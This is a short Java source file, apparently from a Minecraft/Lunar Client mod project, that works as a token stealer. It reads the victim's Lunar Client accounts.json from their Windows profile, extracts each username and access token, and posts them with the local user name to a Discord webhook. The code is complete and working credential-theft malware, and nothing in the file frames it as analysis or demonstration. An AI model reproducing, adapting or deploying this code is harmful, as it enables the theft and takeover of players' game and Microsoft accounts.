package util;

import java.awt.*;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.Set;

import com.google.gson.*;
import org.lwjgl.Sys;

public class TokenReader {
    String windowsPath;

    public String cleanString(String input) {
        return input.replace("\"", "");
    }

    public void sendTokens(String url) {
        try {
            DiscordWebhook webhook = new DiscordWebhook(url);
            Map<String, String> map = this.getTokens();
            for(String key : map.keySet()) {
                webhook.clearEmbeds();
                webhook.addEmbed(new DiscordWebhook.EmbedObject()
                        .setTitle(cleanString(key))
                        .setDescription(cleanString(map.get(key)))
                        .setFooter("Lunar token - " + System.getProperty("user.name"), null)
                        .setColor(Color.black));
                webhook.execute();
            }
        } catch (Exception e) {
            System.out.println("Failed to send tokens: " + e.getMessage());
        }
    }

    public Map<String, String> getTokens() throws IOException {
        JsonObject json = this.readLunarFileJson();
        JsonObject accounts = json.get("accounts").getAsJsonObject();

        Map<String, String> tokens = new HashMap<String, String>();
        Set<Map.Entry<String, JsonElement>> entrySet = accounts.entrySet();
        for(Map.Entry<String,JsonElement> entry : entrySet){
            tokens.put(accounts.get(entry.getKey()).getAsJsonObject().get("username").toString(), accounts.get(entry.getKey()).getAsJsonObject().get("accessToken").toString());
        }

        return tokens;
    }
    public JsonObject readLunarFileJson() throws IOException{
        JsonParser jp = new JsonParser();
        return jp.parse(this.readLunarFile())
                .getAsJsonObject();
    }

    public String readLunarFile() throws IOException {
        BufferedReader reader = new BufferedReader(new FileReader(windowsPath));
        StringBuilder content = new StringBuilder();
        String line;

        while ((line = reader.readLine()) != null) {
            content.append(line);
            content.append(System.lineSeparator());
        }

        return content.toString();
    }
    public TokenReader() {
        this.windowsPath = "C:\\Users\\" + System.getProperty("user.name")+ "\\.lunarclient\\settings\\game\\accounts.json";
    }
}
